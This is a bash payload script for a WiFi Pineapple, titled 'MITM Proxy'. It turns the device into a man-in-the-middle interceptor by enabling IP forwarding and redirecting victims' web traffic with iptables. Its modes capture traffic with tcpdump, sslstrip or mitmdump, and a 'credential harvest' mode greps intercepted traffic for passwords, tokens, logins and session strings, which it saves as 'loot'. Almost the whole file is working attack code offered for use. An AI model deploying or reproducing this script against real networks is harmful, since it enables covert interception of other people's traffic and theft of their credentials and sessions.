#!/bin/bash
# Title: MITM Proxy
# Author: NullSec
# Description: Transparent HTTP/HTTPS proxy with request logging
# Category: nullsec/interception

LOOT_DIR="/mmc/nullsec/mitmproxy"
mkdir -p "$LOOT_DIR"

PROMPT "MITM PROXY

Transparent proxy for
HTTP/HTTPS interception.

Captures and logs all
web requests flowing
through the Pineapple.

Modes:
- HTTP transparent proxy
- SSL strip + capture
- Full request logging

Press OK to configure."

# Find gateway interface
IFACE=""
for i in br-lan eth0 wlan1 wlan0; do
    [ -d "/sys/class/net/$i" ] && IFACE=$i && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "No interface found!"; exit 1; }

GATEWAY_IP=$(ip route | grep default | awk '{print $3}' | head -1)
LOCAL_IP=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
LOCAL_IP=${LOCAL_IP:-10.0.0.1}

PROMPT "PROXY MODE:

1. HTTP only (port 80)
2. HTTP + SSL strip
3. Full HTTPS intercept
4. Credential harvest

Interface: $IFACE
Local IP: $LOCAL_IP

Select mode next."

PROXY_MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PROXY_MODE=1 ;; esac

PROXY_PORT=$(NUMBER_PICKER "Proxy port:" 8080)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PROXY_PORT=8080 ;; esac

DURATION=$(NUMBER_PICKER "Duration (minutes):" 15)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=15 ;; esac

resp=$(CONFIRMATION_DIALOG "START MITM PROXY?

Mode: $PROXY_MODE
Port: $PROXY_PORT
Interface: $IFACE
Duration: ${DURATION}m

This will intercept
client traffic.

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
REQUEST_LOG="$LOOT_DIR/requests_$TIMESTAMP.log"
CRED_LOG="$LOOT_DIR/creds_$TIMESTAMP.log"

LOG "Starting MITM Proxy..."
SPINNER_START "Configuring proxy..."

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush existing iptables rules for our chain
iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port "$PROXY_PORT" 2>/dev/null
iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port "$PROXY_PORT" 2>/dev/null

# HTTP redirect
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port "$PROXY_PORT"

case $PROXY_MODE in
    1) # HTTP only - tcpdump-based capture
        timeout $((DURATION * 60)) tcpdump -i "$IFACE" -A -s 0 'tcp port 80' 2>/dev/null | \
            grep -iE "^(GET|POST|Host:|Cookie:|Authorization:|Referer:)" > "$REQUEST_LOG" &
        PROXY_PID=$!
        ;;
    2) # SSL strip
        iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port "$PROXY_PORT"
        if command -v sslstrip >/dev/null 2>&1; then
            timeout $((DURATION * 60)) sslstrip -l "$PROXY_PORT" -w "$REQUEST_LOG" -f 2>/dev/null &
        else
            timeout $((DURATION * 60)) tcpdump -i "$IFACE" -A -s 0 'tcp port 80 or tcp port 443' 2>/dev/null | \
                grep -iE "^(GET|POST|Host:|Cookie:|user|pass|login)" > "$REQUEST_LOG" &
        fi
        PROXY_PID=$!
        ;;
    3) # Full HTTPS intercept
        iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port "$PROXY_PORT"
        if command -v mitmproxy >/dev/null 2>&1; then
            timeout $((DURATION * 60)) mitmdump --mode transparent -p "$PROXY_PORT" \
                --set flow_detail=2 -w "$LOOT_DIR/flows_$TIMESTAMP.bin" 2>/dev/null &
        else
            timeout $((DURATION * 60)) tcpdump -i "$IFACE" -w "$LOOT_DIR/full_$TIMESTAMP.pcap" -s 0 \
                'tcp port 80 or tcp port 443' 2>/dev/null &
        fi
        PROXY_PID=$!
        ;;
    4) # Credential harvest
        iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port "$PROXY_PORT"
        timeout $((DURATION * 60)) tcpdump -i "$IFACE" -A -s 0 \
            'tcp port 80 or tcp port 443 or tcp port 21 or tcp port 110' 2>/dev/null | \
            grep -iE "user|pass|login|email|auth|credential|token|session" > "$CRED_LOG" &
        PROXY_PID=$!
        ;;
esac

SPINNER_STOP

PROMPT "MITM PROXY ACTIVE!

Mode: $PROXY_MODE
Port: $PROXY_PORT
Interface: $IFACE

Logging to:
$LOOT_DIR/

Press OK when done
or wait ${DURATION}m."

# Wait for capture to finish
wait $PROXY_PID 2>/dev/null

# Cleanup iptables
iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port "$PROXY_PORT" 2>/dev/null
iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port "$PROXY_PORT" 2>/dev/null

# Stats
REQ_COUNT=0
[ -f "$REQUEST_LOG" ] && REQ_COUNT=$(wc -l < "$REQUEST_LOG" | tr -d ' ')
CRED_COUNT=0
[ -f "$CRED_LOG" ] && CRED_COUNT=$(wc -l < "$CRED_LOG" | tr -d ' ')

TOTAL_SIZE=$(du -sh "$LOOT_DIR" 2>/dev/null | awk '{print $1}')

PROMPT "MITM PROXY STOPPED

Requests logged: $REQ_COUNT
Credentials found: $CRED_COUNT
Loot size: $TOTAL_SIZE

Saved to:
$LOOT_DIR/

Press OK to exit."
